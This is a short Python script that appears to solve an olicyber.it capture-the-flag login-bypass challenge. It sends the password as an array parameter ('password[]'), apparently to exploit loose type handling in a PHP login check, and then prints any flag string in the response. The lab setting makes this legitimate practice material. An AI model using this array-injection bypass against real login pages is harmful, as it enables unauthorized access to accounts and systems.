import requests

url = "http://ennesimo_login_bypass.challs.olicyber.it/index.php"
payload = {"password[]":"unapasswordmoltosicura"}

r = requests.post(url, data=payload).text
for i in r.split():
    if "flag{" in i.lower():
        print(i)

